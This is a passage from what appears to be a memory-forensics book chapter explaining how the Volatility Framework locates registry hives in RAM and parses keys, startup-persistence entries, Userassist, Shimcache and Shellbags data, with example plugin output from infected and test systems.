Volatility Foundation Volatility Framework 2.4
Virtual    Physical   Name
---------- ---------- ----
0x82b7a140 0x02b7a140 [no name]
0x820235c8 0x203675c8 \SystemRoot\System32\Config\SAM
0x87a1a250 0x27eb3250 \REGISTRY\MACHINE\SYSTEM
0x87a429d0 0x27f9d9d0 \REGISTRY\MACHINE\HARDWARE
0x87ac34f8 0x135804f8 \SystemRoot\System32\Config\DEFAULT
0x88603008 0x20d36008 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0x88691008 0x1ca1c008 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0x9141e9d0 0x1dc569d0 \??\C:\Windows\System32\config\COMPONENTS
[snip]
```

---

**NOTE**

Notice that in addition to well-known registries (`SAM`, `SYSTEM`, `NTUSER.DAT`) there is also a registry that has a name `[no name]`. This registry contains keys and symbolic links for `REGISTRY\A` (an application hive), `REGISTRY\MACHINE` and `REGISTRY\USER`. For information regarding application hives, see [http://msdn.microsoft.com/en-us/library/windows/hardware/jj673019%28v=vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/jj673019%28v=vs.85%29.aspx).

---

Locating registry hives is critical because your ability to print the actual key and value data relies on first finding the hives. The registry file format is well documented by Timothy D. Morgan ([http://sentinelchicken.com/data/TheWindowsNTRegistryFileFormat.pdf](http://sentinelchicken.com/data/TheWindowsNTRegistryFileFormat.pdf)). You can see the simplified structure of a registry file on disk in [Figure 10-2](#figure10-2). The registry file contains a header and is broken up into sections called hive bins. Subsequently, each hive bin has a header and is broken up into cells. The cells contain the actual key and value data.

![c10f002.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c10/c10f002.png)

*[**Figure 10-2:**](#figureanchor10-2) A simplified diagram of the registry file format*

### Address Translations

Because of address translation, things become a bit more complicated when dealing with registry hives in memory as opposed to registry files on disk. The Configuration Manager (CM) is the component of the kernel that manages the registry ([http://msdn.microsoft.com/](http://msdn.microsoft.com/)en-us/library/windows/hardware/ff565712%28v=vs.85%29.aspx) and specifically deals with the address translation. The CM creates a mapping between cell indexes (values that are used to find the cells that contain the registry key data) and virtual addresses. The CM then stores this mapping in the `_HHIVE` structure. The member of interest is `Storage`, which is of type `_DUAL`. If you look up the `_DUAL` structure, you will see the `Map` member.

```
>>> dt("_DUAL")
'_DUAL' (220 bytes)
0x0   : Length               ['unsigned long']
0x4   : Map                  ['pointer', ['_HMAP_DIRECTORY']]
0x8   : SmallDir             ['pointer', ['_HMAP_TABLE']]
0xc   : Guard                ['unsigned long']
0x10  : FreeDisplay          ['array', 24, ['_RTL_BITMAP']]
[snip]
```

If you follow the `Map` member, you find all the structures needed to correctly obtain the virtual address for a registry key (in bold):

```
>>> dt("_HMAP_DIRECTORY")
'_HMAP_DIRECTORY' (4096 bytes)
0x0   : Directory            ['array', 1024, ['pointer', ['_HMAP_TABLE']]]

>>> dt("_HMAP_TABLE")
'_HMAP_TABLE' (8192 bytes)
0x0   : Table                ['array', 512, ['_HMAP_ENTRY']]

>>> dt("_HMAP_ENTRY")
'_HMAP_ENTRY' (16 bytes)
0x0   : BlockAddress         ['unsigned long']
0x4   : BinAddress           ['unsigned long']
0x8   : CmView               ['pointer', ['_CM_VIEW_OF_FILE']]
0xc   : MemAlloc             ['unsigned long']
```

Every cell index is broken up and used as a set of indices into the aforementioned structures. [Figure 10-3](#figure10-3) demonstrates an example of how cell indexes are broken up to obtain virtual addresses, which was described in Brendan Dolan-Gavitt’s presentation ([http://www.dfrws.org/2008/proceedings/p26-dolan-gavitt_pres.pdf](http://www.dfrws.org/2008/proceedings/p26-dolan-gavitt_pres.pdf)). Here is a description of each of the bit fields:

- **Bit 0:** Indicates whether the key is stable or volatile. Stable keys can also be found in the registry file on disk, whereas volatile keys are found only in memory.
- **Bits 1–10:** An index into the `Directory` member.
- **Bits 11–19:** An index into the `Table` member.
- **Bits 20–31:** The offset within the `BlockAddress` of where the key data resides. This is the cell within the registry. The cell contains the length of the data. Therefore, after you find the offset within the `BlockAddress`, you must add 4 (the size of the `Length` member) to get to the actual data.

![c10f003.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c10/c10f003.png)

*[**Figure 10-3:**](#figureanchor10-3) Cell index breakdown to obtain a virtual address*

### Printing Keys and Values

Registry keys are stored as a tree-like structure, where a root key exists. The children, or subkeys, are traversed until the leaf node (the last part of the key path) is accessed. Therefore, to access a registry key and its data, you have to start from the root key and walk down the tree until you reach the leaf node. The structure for nodes, `_CM_KEY_NODE`, is shown in the following code:

```
>>> dt("_CM_KEY_NODE")
'_CM_KEY_NODE' (80 bytes)
0x0   : Signature                 ['String', {'length': 2}]
0x2   : Flags                     ['unsigned short']
0x4   : LastWriteTime             ['WinTimeStamp', {}]
0xc   : Spare                     ['unsigned long']
0x10  : Parent                    ['unsigned long']
0x14  : SubKeyCounts              ['array', 2, ['unsigned long']]
0x1c  : ChildHiveReference        ['_CM_KEY_REFERENCE']
0x1c  : SubKeyLists               ['array', 2, ['unsigned long']]
0x24  : ValueList                 ['_CHILD_LIST']
[snip]
0x4c  : Name                      ['String', {
                   'length': <function <lambda> at 0x1017eb5f0>}]
```

When you use the `printkey` plugin, you pass it the desired registry key path on command line (the `–K/--key` argument). The plugin finds all available registries in memory and accesses the `SubKeyLists` and `ValueLists` members to traverse the trees. Thus, this plugin enables you to print a key, its subkeys, and its values. The following example shows you how to use this plugin:

```
$ python vol.py -f win7.vmem --profile=Win7SP1x86 printkey 
    -K "controlset001\control\computername"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile
----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2011-10-20 15:25:16 
Subkeys:
  (S) ComputerName
  (V) ActiveComputerName
Values:
```

In the output, you can see the registry path, key name, last write time, subkeys, and any values that the key has (in this case, there were none). The `printkey` plugin also tells you whether the registry key or its subkeys are stable (S) or volatile (V).

---

**NOTE**

You can also pass the `printkey` plugin an offset (using `–o/--offset`), which specifies the virtual address of a specific registry hive. This can be useful if you want to concentrate on only one registry hive. You obtain the virtual address from the `hivelist` plugin, as shown earlier in the chapter.

---

### Detecting Malware Persistence

Several registry keys are relevant in investigations involving malware. For example, malware may need a way to persist on a system even after the system is rebooted. One of the easiest ways to accomplish this task is to modify one of the startup registry keys. These keys contain information about programs that run when the system boots up or a user logs in. Therefore, you should check these known registry keys to see if the malware is using them to persist on the machine. The following list shows some known startup keys.

- For system startup: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- For user logons: `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run HKCU\Software\Microsoft\Windows\CurrentVersion\Run HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`

For a more comprehensive list of startup keys, see the `RegRipper` wiki ([https://code.google.com/p/regripper/wiki/ASEPs](https://code.google.com/p/regripper/wiki/ASEPs)) or the Sysinternals `AutoRuns` utility ([http://technet.microsoft.com/en-us/sysinternals/bb963902.aspx](http://technet.microsoft.com/en-us/sysinternals/bb963902.aspx)).

---

**NOTE**

`HKEY_CURRENT_USER` (or `HKCU` for short) refers to a user-specific registry. `HKEY_LOCAL_MACHINE` (or `HKLM` for short) refers to a registry used by the system.

---

An example of malware persistence is shown in the following output. The malicious executable `C:\WINDOWS\system32\svchosts.exe` is run every time the system starts up. This is immediately suspicious because no `svchosts.exe` executable exists on a clean Windows machine—it is attempting to blend in with the legitimate `svchost.exe` (without the extra “s”). Notice that you do not have to prefix the `–K/--key` argument with `HKLM\SOFTWARE` because it is actually not part of the path within the registry, but instead denotes which registry contains the key (for example, the `SOFTWARE` hive on the local machine).

```
$ python vol.py -f grrcon.raw --profile=WinXPSP3x86 printkey 
      -K "Microsoft\Windows\CurrentVersion\Run"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\software
Key name: Run (S)
Last updated: 2012-04-28 01:59:22 UTC+0000

Subkeys:
  (S) OptionalComponents

Values:
REG_SZ        Adobe Reader Speed Launcher : 
        (S) "C:\Program Files\Adobe\Reader 9.0\Reader\Reader_sl.exe"
REG_SZ        Adobe ARM       : 
        (S) "C:\Program Files\Common Files\Adobe\ARM\1.0\AdobeARM.exe"
REG_SZ        svchosts        : 
        (S) C:\WINDOWS\system32\svchosts.exe
```

The following output shows an example of persistence when the user logs in. In this case, the program of interest turns out to be a key logger that runs every time the user `Andrew` (as shown in the registry path) logs on to the system. Notice that the entire path after `HKCU` is given to `printkey`:

```
$ python vol.py -f Win7.raw --profile=Win7SP1x64 printkey 
      -K "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN" 
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable  (V) = Volatile
---------------------------- 
Registry: \??\C:\Users\Andrew\ntuser.dat 
Key name: Run (S) 
Last updated: 2013-03-10 22:47:09 UTC+0000

Subkeys:

Values:
REG_SZ mswinnt : (S) "C:\Users\Andrew\Desktop\mswinnt.exe" 
      --logfile=log.txt --encryption-index=4
```

Another method of persistence that malware often uses is the creation of a service. When a service is created, the registry (in particular, `HKLM\SYSTEM\CurrentControlSet\Services`) is modified to contain information about the service. You can print this key and determine whether a service name stands out as suspicious. If you use timelines, as discussed in Chapter 18, and examine the services registry key, you can quickly identify newly added services based on the last written timestamps. The following is example output from a memory sample with Stuxnet that demonstrates this persistence mechanism:

```
$ python vol.py –f stuxnet.vmem --profile=WinXPSP3x86 printkey 
      -K "ControlSet001\services\MRxNet"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
Key name: MRxNet (S)
Last updated: 2011-06-03 04:26:47 UTC+0000

Subkeys:
  (V) Enum

Values:
REG_SZ        Description     : (S) MRXNET
REG_SZ        DisplayName     : (S) MRXNET
REG_DWORD     ErrorControl    : (S) 0
REG_SZ        Group           : (S) Network
REG_SZ        ImagePath       : (S) \??\C:\WINDOWS\system32\Drivers\mrxnet.sys
REG_DWORD     Start           : (S) 1
REG_DWORD     Type            : (S) 1
```

---

**NOTE**

You can obtain the `CurrentControlSet` by querying the following volatile key:

```
$ vol.py -f XPSP3x86.vmem --profile=WinXPSP3x86 printkey 
      -K currentcontrolset
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
Key name: CurrentControlSet (V)
Last updated: 2010-10-29 17:08:47 UTC+0000

Subkeys:

Values:
REG_LINK      SymbolicLinkValue : (V) \Registry\Machine\System\ControlSet001
```

This is important to note because there can be many control sets that contain different system configurations (see [http://support.microsoft.com/kb/100010](http://support.microsoft.com/kb/100010)). The `CurrentControlSet` contains the settings that the machine is using at the current moment. Therefore, if you use the incorrect control set, you may not see the current configurations.

---

Although the `printkey` plugin is very useful, it is also limited in that it prints only the raw key values. This is fine for integer or string values, but it is not sufficient for keys that contain binary or embedded data, such as Userassist keys. These keys require some extra processing to interpret before displaying data to the user; otherwise, it would just look like a blob of hex bytes. Also, the `printkey` plugin only checks one registry key at a time. For these reasons, the Volatility Registry API was created.

## Volatility’s Registry API

The Registry API was designed to allow easy processing of complicated registry keys or many keys at the same time. For example, you can use it to automatically check the 20 most common startup keys, sort keys based on their last write time, and so on. In the following code, we show you how to import and instantiate the Registry API from the `volshell` plugin. You use nearly identical code to call the API from your own plugins as well.

```
>>> import volatility.plugins.registry.registryapi as registryapi
>>> regapi = registryapi.RegistryApi(self._config)
```

When the Registry API object is instantiated, a dictionary of all registry files in the memory sample is saved. This makes it more efficient to switch between hives without rescanning. You can check out the `RegRipper` project ([http://code.google.com/p/regripper/](http://code.google.com/p/regripper/)) to get an idea of the numerous possibilities for writing plugins. In fact, Brendan created a proof of concept project named `VolRip` for an older version of Volatility that allowed an investigator to run `RegRipper` commands against memory-resident registry hives (see [http://moyix.blogspot.com/2009/03/regripper-and-volatility-prototype.html](http://moyix.blogspot.com/2009/03/regripper-and-volatility-prototype.html)). However, this was replaced with the Registry API, which is more portable because it doesn’t rely on the Perl-to-Python glue.

---

**NOTE**

An alternative to parsing the registry files in memory is using the `dumpfiles` plugin (described in Chapter 16) to extract hives from the Windows cache manager and then parse them with external tools. This method pulls the cached copy of the hive file, so volatile keys will not be included. Furthermore, there may be zero-padded gaps in each registry file due to paging. Most offline registry tools expect to parse a complete registry file from disk (not one dumped from memory) and may need some tweaking to handle these dumped registry files.

Also note that Windows 7 systems do not cache the registry hive files in the same manner as earlier versions of Windows. Thus, `dumpfiles` cannot be used in the described manner.

---

The following shows an example from within the `volshell` plugin that uses the Registry API to print out the subkeys of a designated registry key. First you set the current context to be the `NTUSER.DAT` registry hive of the administrator, and then you use the `reg_get_all_subkeys` function. In this case, you just print out the name, but you could process the results as you would any registry key of type `_CM_KEY_NODE`:

```
>>> regapi.set_current(hive_name = "NTUSER.DAT", user = "administrator")
>>> key = "software\\microsoft\\windows\\currentversion\\explorer"
>>> for subkey in regapi.reg_get_all_subkeys(None, key = key):
...     print subkey.Name
...
Advanced
BitBucket
CabinetState
CD Burning
CLSID
ComDlg32
[snip]
```

Additionally, the following code snippet shows how to obtain registry values. Again, this is from within the `volshell` plugin. If you want to get a particular value by name, you can use `reg_get_value`.

```
>>> k = "controlset001\\Control\\ComputerName\\ComputerName"
>>> v = "ComputerName"
>>> val = regapi.reg_get_value(hive_name = "system", key = k, value = v)
>>> print val
BOB-DCADFEDC55C
```

The following code shows how to print multiple registry values. Here you can see that one of the startup keys is used, and each of its values is printed. Notice that you can see the malicious program that runs every time the system reboots:

```
>>> k = "Microsoft\\Windows\\CurrentVersion\\Run"
>>> regapi.set_current(hive_name = "software")
>>> for value, data in regapi.reg_yield_values(hive_name = "software", key = k):
...     print value, "\n      ", data
... 
Adobe Reader Speed Launcher 
      "C:\Program Files\Adobe\Reader 9.0\Reader\Reader_sl.exe"
Adobe ARM 
      "C:\Program Files\Common Files\Adobe\ARM\1.0\AdobeARM.exe"
svchosts 
      C:\WINDOWS\system32\svchosts.exe
```

If you wanted to get the last ten modified keys from the administrator’s `NTUSER.DAT` registry, the following code snippet shows how to accomplish that. In this case, the last activity in the `NTUSER.DAT` hive shows that a network share was created:

```
>>> hive = "NTUSER.DAT"
>>> for t, k in regapi.reg_get_last_modified(hive_name = hive, count = 10):
...     print t, k
... 
2012-04-28 02:22:16 UTC+0000  
  $$$PROTO.HIV\Software\Microsoft\Windows\CurrentVersion\Explorer
2012-04-28 02:21:41 UTC+0000
  $$$PROTO.HIV\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
    \##DC01#response
2012-04-28 02:21:41 UTC+0000 
  $$$PROTO.HIV\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
2012-04-28 02:21:41 UTC+0000 $$$PROTO.HIV\Network\z
2012-04-28 02:21:41 UTC+0000 $$$PROTO.HIV\Network
2012-04-28 02:21:41 UTC+0000 $$$PROTO.HIV
2012-04-28 02:21:21 UTC+0000 
  $$$PROTO.HIV\Software\Microsoft\Windows NT\CurrentVersion\PrinterPorts
2012-04-28 02:21:21 UTC+0000 
  $$$PROTO.HIV\Software\Microsoft\Windows NT\CurrentVersion\Devices
2012-04-28 02:21:16 UTC+0000 $$$PROTO.HIV\SessionInformation
2012-04-28 02:21:15 UTC+0000 
  $$$PROTO.HIV\Software\Microsoft\Windows\ShellNoRoam\MUICache
```

If you want to see the subkeys and values for each of these keys, you can use a combination of the functions you’ve just seen. The following is example code and partial output, in which you can see that the network share [\\DC01\response](http://\\DC01\response) was mapped to drive “z”. You can use the `consoles` plugin (see Chapter 17) to look for `net use` commands and see whether the drive was mapped by the attacker or by the person who collected the memory sample.

```
>>> hive = "NTUSER.DAT"
>>> for t, k in regapi.reg_get_last_modified(hive_name = hive, count = 10):
...     print "LastWriteTime:", t
...     print "Key:", k
...     k = k.replace("$$$PROTO.HIV\\", "")
...     for subkey in regapi.reg_get_all_subkeys(hive_name = hive, key = k):
...             print "Subkey: ", subkey.Name
...     for value, data in regapi.reg_yield_values(hive_name = hive, key = k):
...             print "Value:", value, data
...     print "*" * 20
...
[snip]
LastWriteTime: 2012-04-28 02:21:41 UTC+0000 
Key: $$$PROTO.HIV\Software\Microsoft\Windows\CurrentVersion\Explorer
 \MountPoints2\##DC01#response
Value: BaseClass Drive
Value: _CommentFromDesktopINI 
Value: _LabelFromDesktopINI 
[snip]
********************
LastWriteTime: 2012-04-28 02:21:41 UTC+0000 
Key: $$$PROTO.HIV\Network\z
Value: RemotePath \\DC01\response
Value: UserName 
Value: ProviderName Microsoft Windows Network
Value: ProviderType 131072
Value: ConnectionType 1
Value: DeferFlags 4
```

## Parsing Userassist Keys

The Userassist keys are an important registry artifact used for determining what programs the user ran, as well as the time they were run. These keys are found in the `NTUSER.DAT` registries of each user on a machine. All the information is contained in a binary blob that must be parsed in a special way. The key paths may be different depending on the system you are investigating. For example, on Windows XP, 2003, Vista, and 2008, the Userassist key path is this:

```
HKCU\software\microsoft\windows\currentversion\explorer\userassist
  \{75048700-EF1F-11D0-9888-006097DEACF9}\Count
```

Starting in Windows 7, the Userassist key path can be one of the following:

```
HKCU\software\microsoft\windows\currentversion\explorer\userassist
  \{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count
HKCU\software\microsoft\windows\currentversion\explorer\userassist
  \{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\Count
```

In addition to the binary data that must be parsed for each of these keys, the value name contains the path of the program (or link) that was accessed. However, it is rot13 encoded, which is a simple Caesar cipher in which the letters are shifted by 13 places. The following raw data was extracted with the `printkey` plugin. The value, as you can see, is not readable because it is rot13 encoded. Furthermore, the binary data contains a timestamp in bold.

```
REG_BINARY    HRZR_EHACNGU:P:\JVAQBJF\flfgrz32\pzq.rkr : (S) 
 0x00000000  01 00 00 00 06 00 00 00 b0 41 5e b0 95 b6 ca 01 
```

Parsing Userassist data utilizes defined structures. Similar to the key paths, the structures vary depending on the operating system. You can see the structure for Windows XP, 2003, Vista, and 2008 machines in the following code. The members of interest are `CountStartingAtFive`, which is the number of times the application has run, and the `LastUpdated` timestamp, which is the last time the application was run.

```
>>> dt("_VOLUSER_ASSIST_TYPES")
'_VOLUSER_ASSIST_TYPES' (16 bytes)
0x0   : ID                             ['unsigned int']
0x4   : CountStartingAtFive            ['unsigned int']
0x8   : LastUpdated                    ['WinTimeStamp']
```

The following output shows the translated data from the `userassist` plugin. You can see the path to the program (`cmd.exe`) and determine that it ran one time, at 3:42:15 on February 26, 2010. Based on this information, you can go on to use the `cmdscan` or `consoles` plugins (see Chapter 17) to see whether any attacker’s commands still reside in memory. The `userassist` plugin also outputs the raw binary data in case you need to verify that the output is correct.

```
$ python vol.py –f XPSP3x86.vmem --profile=WinXPSP3x86 userassist
[snip]
REG_BINARY    UEME_RUNPATH:C:\WINDOWS\system32\cmd.exe : 
ID:             1
Count:          1
Last updated:   2010-02-26 03:42:15 
0x00000000  01 00 00 00 06 00 00 00 b0 41 5e b0 95 b6 ca 01   
```

## Detecting Malware with the Shimcache

The Shimcache registry keys are part of the Application Compatibility Database, which “identifies application compatibility issues and their solutions” (see [http://msdn.microsoft.com/en-us/library/bb432182(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/bb432182(v=vs.85).aspx)). These keys contains a path for an executable and the last modified timestamp from the `$STANDARD_INFORMATION` attribute of the MFT entry. This is very useful for proving that a piece of malware was on the system and what time it ran. Two possible registry keys are used, depending on the operating system.

- For Windows XP: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatibility`
- For Window 2003, Vista, 2008, 7, and 8: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`

If you print out those registry keys, however, you will see a lot of binary data. This data must be parsed using specific structures. The following code shows the structures used to represent the Shimcache records on a Windows XP system:

```
>>> dt("ShimRecords")
'ShimRecords' (None bytes)
0x0   : Magic               ['unsigned int']
0x8   : NumRecords          ['short']
0x190 : Entries             ['array', <function <lambda> at 0x103413488>, 
                                ['AppCompatCacheEntry']]

>>> dt("AppCompatCacheEntry")
'AppCompatCacheEntry' (552 bytes)
0x0   : Path                ['NullString', {'length': 520, 'encoding': 'utf8'}]
0x210 : LastModified        ['WinTimeStamp', {}]
0x218 : FileSize            ['long long']
0x220 : LastUpdate          ['WinTimeStamp', {}]
```

A member of interest is the `Entries` list of `ShimRecords`, which is a list of `AppCompatCacheEntry` objects. The `AppCompatCacheEntry` objects are the actual objects that contain the information about the Shimcache record, such as the file `Path` and timestamps. The following output shows the raw data for the `AppCompatCache` value on a Windows XP system:

```
$ python vol.py –f XPSP3x86.vmem --profile=WinXPSP3x86 printkey 
      –K "ControlSet001\Control\Session Manager\AppCompatibility"
[snip]
REG_BINARY    AppCompatCache  : (S) 
[snip]
0x00000190  5c 00 3f 00 3f 00 5c 00 43 00 3a 00 5c 00 57 00   \.?.?.\.C.:.\.W.
0x000001a0  49 00 4e 00 44 00 4f 00 57 00 53 00 5c 00 73 00   I.N.D.O.W.S.\.s.
0x000001b0  79 00 73 00 74 00 65 00 6d 00 33 00 32 00 5c 00   y.s.t.e.m.3.2.\.
0x000001c0  6f 00 6f 00 62 00 65 00 5c 00 6d 00 73 00 6f 00   o.o.b.e.\.m.s.o.
0x000001d0  6f 00 62 00 65 00 2e 00 65 00 78 00 65 00 00 00   o.b.e...e.x.e...
[snip]
0x000003a0  00 a0 13 80 5e 3c c6 01 00 6e 00 00 00 00 00 00   ....^<...n......
0x000003b0  bc d9 7b 22 94 b6 ca 01 5c 00 3f 00 3f 00 5c 00   ..{"....\.?.?.\.
[snip]
```

The following example shows (redacted) output from a Windows 2003 server. As you can see, some mysteriously named executables are present:

```
$ python vol.py –f PhysicalMemory.001 --profile=Win2003SP2x86 shimcache
Volatility Foundation Volatility Framework 2.4
Last Modified                  Path
------------------------------ ----
[snip]
2007-02-17 10:19:26 UTC+0000   \??\C:\WINDOWS\system32\inetsrv\iisrstas.exe
2007-02-17 10:19:26 UTC+0000   \??\C:\WINDOWS\system32\iisreset.exe
2007-02-17 10:59:04 UTC+0000   \??\C:\Program Files\Outlook Express\setup50.exe
2009-03-08 11:32:52 UTC+0000   \??\C:\WINDOWS\system32\ieudinit.exe
2010-07-22 07:47:49 UTC+0000   \??\C:\XXX\nv.exe
2010-07-22 08:40:57 UTC+0000   \??\C:\XXX\123.exe
2010-07-22 07:44:57 UTC+0000   \??\C:\XXX\dl.exe
2010-07-22 07:46:41 UTC+0000   \??\C:\XXX\ow.exe
[snip]
2010-02-06 23:45:26 UTC+0000   \??\C:\WINDOWS\PSEXESVC.EXE
[snip]
2010-01-19 09:21:41 UTC+0000   \??\E:\XXX\sample.exe
2010-01-19 09:02:26 UTC+0000   \??\E:\XXX\s.exe
[snip]
```

---

**NOTE**

One thing to note about the Shimcache entries is that older entries are often overwritten with newer ones as the maximum size of the key value is reached (the size varies depending on the system). Therefore, you may see residual data (similar to slack space on a hard disk) on a machine that has been running for a while.

---

## Reconstructing Activities with Shellbags

Shellbags is a commonly used term to describe a collection of registry keys that allow the “Windows operating system to track user window viewing preferences specific to Windows Explorer” (see [http://www.dfrws.org/2009/proceedings/p69-zhu.pdf](http://www.dfrws.org/2009/proceedings/p69-zhu.pdf)). These keys contain a wealth of information relevant for a forensic investigation. Some example artifacts that you can find include these:

- Windows sizes and preferences
- Icon and folder view settings
- Metadata such as MAC timestamps
- Most Recently Used (MRU) files and file type (zip, directory, installer)
- Files, folders, zip files, and installers that existed at one point on the system (even if deleted)
- Network shares and folders within the shares
- Metadata associated with any of these types that may include timestamps and absolute paths
- Information about TrueCrypt volumes

---

**NOTE**

For more information on the Shellbag data structures, the corresponding registry keys, and their use in forensic investigations, see the following resources:

- *Shellbag Analysis* by Harlan Carvey: [http://windowsir.blogspot.com/2012/08/shellbag-analysis.html](http://windowsir.blogspot.com/2012/08/shellbag-analysis.html)
- *Windows Shellbag Forensics* by Willi Ballenthin: [http://www.williballenthin.com/forensics/shellbags](http://www.williballenthin.com/forensics/shellbags)
- *Shellbags Forensics: Addressing a Misconception:* [http://www.4n6k.com/2013/12/shellbags-forensics-addressing.html](http://www.4n6k.com/2013/12/shellbags-forensics-addressing.html)

---

### Shellbags in Memory

The `shellbags` plugin for Volatility uses the Registry API to extract data from the appropriate keys. It then parses that data using Shellbag data types and outputs the formatted version, along with the MRU information. Using the MRU details, you can correlate the last write time of the registry key with the last updated `shellbags` item. Here is an example of using the `shellbags` plugin:

```
$ python vol.py –f XPSP3.vmem --profile=WinXPSP3x86 shellbags
Volatility Foundation Volatility Framework 2.4
Registry: \Device\HarddiskVolume1\Documents and Settings\User\NTUSER.DAT 
Key: Software\Microsoft\Windows\ShellNoRoam\BagMRU\0\0
Last updated: 2011-06-03 04:24:36 
Value:          1
Mru:            0
File Name:      DOCUME~1       
Modified Date:  2010-08-22 17:38:04  
Create Date:    2010-08-22 13:32:26  
Access Date:    2010-08-26 01:04:52  
File Attribute: DIR
Path:           C:\Documents and Settings
------------------------------------------------------------
Value:          0
Mru:            1
File Name:      PROGRA~1       
Modified Date:  2010-08-25 23:04:02   
Create Date:    2010-08-22 13:32:48  
Access Date:    2010-08-25 23:04:22  
File Attribute: RO, DIR
Path:           C:\Program Files
------------------------------------------------------------
Value:          4
Mru:            2
File Name:      WINDOWS        
Modified Date:  2010-08-26 00:06:24  
Create Date:    2010-08-22 13:29:34  
Access Date:    2010-10-08 03:27:40  
File Attribute: DIR
Path:           C:\WINDOWS
[snip]
```

Here are a few things to note about Shellbags entries:

- `SHELLITEM` entries remain in the registry even after the file has been deleted.
- Timestamps associated with `SHELLITEM` entries are not updated, even if the file is modified or accessed sometime later.
- `ITEMPOS` entries are updated if the file is moved, deleted, or accessed.
- If a user is not logged on to the system at the time the memory sample is taken, that user’s hives are not available in memory and therefore the Shellbag data is not processed.

### Finding TrueCrypt Volumes with Shellbags

TrueCrypt volumes also appear in Shellbags keys, often as `ITEMPOS` entries. Because `ITEMPOS` entries are updated, if the TrueCrypt volume is moved or deleted, its entry will be updated or removed to reflect the change. Files accessed from this volume will have their Shellbags entries remain intact, however. In the following output, you can see that the machine has a TrueCrypt volume mounted on the `T:` drive, and it was accessed on `2012-09-25 11:48:46`.

```
$ python vol.py –f XPSP3.vmem --profile=WinXPSP3x86 shellbags
Volatility Foundation Volatility Framework 2.4
Registry: \Device\HarddiskVolume1\Documents and Settings\user\NTUSER.DAT
Key: Software\Microsoft\Windows\ShellNoRoam\BagMRU\0
Last updated: 2012-09-25 13:22:43
Value   Mru   Entry Type     Path
------- ----- -------------- ----
    1       0     Volume Name    C:\
    3       1     Volume Name    Z:\
    4       2     Volume Name    T:\
***************************************************************************
Registry: \Device\HarddiskVolume1\Documents and Settings\user\NTUSER.DAT 
Key: Software\Microsoft\Windows\ShellNoRoam\Bags\52\Shell
Last updated: 2012-09-25 12:51:28 
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      UserData       
Modified Date:  2012-06-22 19:28:50  
Create Date:    2012-06-22 19:28:50  
Access Date:    2012-09-25 12:51:18  
File Attribute: SYS, DIR
Path:           UserData       
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      RECENT~1.XBE   
Modified Date:  2010-10-18 14:00:50  
Create Date:    2010-10-18  14:00:50  
Access Date:    2010-10-18 14:00:50  
File Attribute: ARC
Path:           .recently-used.xbel
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      MYTRUE~1       
Modified Date:  2012-08-17 14:13:48  
Create Date:    2012-08-17 14:12:18  
Access Date:    2012-09-25 11:48:46  
File Attribute: RO, DIR
Path:           MyTrueCryptVolume
------------------------------------------------------------
```

---

**NOTE**

Note that the name `MyTrueCryptVolume` was chosen on purpose when the volume was created so that it would stand out in the registry. Real TrueCrypt volumes will probably not be so obviously named.

---

After the TrueCrypt volume is deleted, its `ITEMPOS` entry disappears from the registry, as shown by the following output:

```
$ python vol.py –f XPSP3.vmem --profile=WinXPSP3x86 shellbags
Volatility Foundation Volatility Framework 2.4
***************************************************************************
Registry: \Device\HarddiskVolume1\Documents and Settings\user\NTUSER.DAT 
Key: Software\Microsoft\Windows\ShellNoRoam\Bags\52\Shell
Last updated: 2012-09-25 14:31:53 
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      UserData       
Modified Date:  2012-06-22 19:28:50  
Create Date:    2012-06-22 19:28:50  
Access Date:    2012-09-25 12:51:18  
File Attribute: SYS, DIR
Path:           UserData       
------------------------------------------------------------
Value:          ItemPos1567x784(1)        
File Name:      RECENT~1.XBE   
Modified Date:  2010-10-18 14:00:50  
Create Date:    2010-10-18  14:00:50  
Access Date:    2010-10-18 14:00:50  
File Attribute: ARC
Path:           .recently-used.xbel
------------------------------------------------------------
```

Although the `MyTrueCryptVolume` entry is no longer in the registry, any individual files that were accessed from the TrueCrypt volume while it was mounted may still have entries in the registry. Because the link between the TrueCrypt volume and its files in the Shellbags keys was severed after its deletion, it becomes difficult to definitively say what files existed on the TrueCrypt volume, given that these keys show only the filename instead of the full path. However, if you have the timestamp of when the TrueCrypt volume existed on the system (either from a previous memory image, registry snapshot, or an MFT file from the disk), you can then extrapolate that knowledge to find `ITEMPOS` entries for files within that time period. In the following example, you can potentially associate `recent news.txt` and `customer emails.txt` with the TrueCrypt volume because they were accessed within about an hour of the access time for `MyTrueCryptVolume`:

```
